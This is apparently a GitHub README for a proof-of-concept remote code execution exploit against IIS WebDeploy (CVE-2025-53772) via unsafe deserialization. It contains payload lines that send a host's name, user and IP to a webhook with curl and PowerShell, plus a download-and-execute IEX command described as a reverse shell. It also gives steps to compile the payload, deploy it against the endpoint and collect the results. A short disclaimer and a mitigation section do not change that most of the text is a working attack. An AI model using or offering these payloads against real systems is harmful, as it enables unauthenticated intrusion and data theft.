# CVE-2025-53772 - IIS WebDeploy RCE Exploit

This repository contains a Proof-of-Concept (PoC) exploit for CVE-2025-53772, a Remote Code Execution vulnerability in IIS WebDeploy through unsafe deserialization.
## ⚠️ Disclaimer
This tool is for educational and authorized security testing purposes only. The author is not responsible for any misuse or damage caused by this software. Only use on systems you own or have explicit permission to test.
## 🔧 Quick Setup
### 1. Customize the Payload
Edit the payload in poc.cs at lines 18-19 to specify your target action:
csharp// Replace with your webhook URL and desired payload
```
set.Add("cmd.exe");
set.Add("/c curl -X POST https://webhook.site/YOUR-WEBHOOK-ID -H \"Content-Type: application/json\" -d \"{\\\"hostname\\\":\\\"%COMPUTERNAME%\\\",\\\"user\\\":\\\"%USERNAME%\\\",\\\"ip\\\":\\\"$(curl -s ifconfig.me)\\\",\\\"exploit\\\":\\\"CVE-2025-53772\\\",\\\"timestamp\\\":\\\"%DATE% %TIME%\\\"}\"");
```
### 📋 Payload Examples
Information Gathering (Recommended):
```
csharpset.Add("powershell.exe");
set.Add("-Command \"$hostname=$env:COMPUTERNAME; $user=$env:USERNAME; $ip=(Invoke-RestMethod -Uri 'https://ipinfo.io/ip' -UseBasicParsing); $body=@{hostname=$hostname;user=$user;ip=$ip;exploit='CVE-2025-53772';timestamp=(Get-Date)} | ConvertTo-Json; Invoke-RestMethod -Uri 'https://webhook.site/YOUR-WEBHOOK-ID' -Method Post -Body $body -ContentType 'application/json'\"");
```
Simple Command Execution:
```
csharpset.Add("cmd.exe");
set.Add("/c calc.exe");  // Opens calculator
```
Reverse Shell (Advanced):
```
csharpset.Add("powershell.exe");
set.Add("-Command \"IEX (New-Object Net.WebClient).DownloadString('http://YOUR-SERVER/shell.ps1')\"");
```
### 2. Generate the Exploit Payload
The GitHub Action will automatically compile the PoC and generate the Base64-encoded payload:

Push your changes to trigger the GitHub Action
Navigate to Actions tab in your repository
Click on the latest workflow run
Find the generated payload in the console output:

<img width="1565" height="623" alt="GitHub Actions payload output" src="https://github.com/user-attachments/assets/512a6037-0ab6-4f1c-b02b-364996c315ee" />
3. Deploy the Exploit
Use the generated Base64 payload against the vulnerable IIS WebDeploy endpoint:
<img width="856" height="255" alt="Payload deployment example" src="https://github.com/user-attachments/assets/88b147cd-fae7-4034-9622-5af3a39b2bec" />
🎯 Vulnerability Details

# CVE ID: CVE-2025-53772
Affected Software: IIS WebDeploy (multiple versions)
Vulnerability Type: Unsafe Deserialization leading to RCE
Attack Vector: Remote, unauthenticated
Severity: Critical

## 🛠️ Manual Compilation (Optional)
If you prefer to compile locally instead of using GitHub Actions:
bash# Windows with .NET Framework
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe poc.cs
poc.exe > payload.txt

## Or with Visual Studio
csc poc.cs
poc.exe
📡 Setting Up a Webhook

Go to webhook.site to get a free webhook URL
Replace YOUR-WEBHOOK-ID in the payload with your unique ID
Monitor incoming requests to see exploit execution results

## 🔍 Detection & Mitigation
Detection:

Monitor for unusual BinaryFormatter deserialization activities
Look for suspicious process spawning from IIS worker processes
Network monitoring for unexpected outbound connections

Mitigation:

Update IIS WebDeploy to the latest patched version
Implement input validation and sanitization
Use allowlists for deserialization types
Deploy network segmentation and monitoring

## 📚 References

CVE-2025-53772 Details
Microsoft Security Advisory
NIST Vulnerability Database

## 🤝 Contributing
Contributions are welcome! Please:

Fork the repository
Create a feature branch
Submit a pull request with detailed description

## 📄 License
This project is licensed under the MIT License - see the LICENSE file for details.

Remember: Always obtain proper authorization before testing on any systems you do not own.
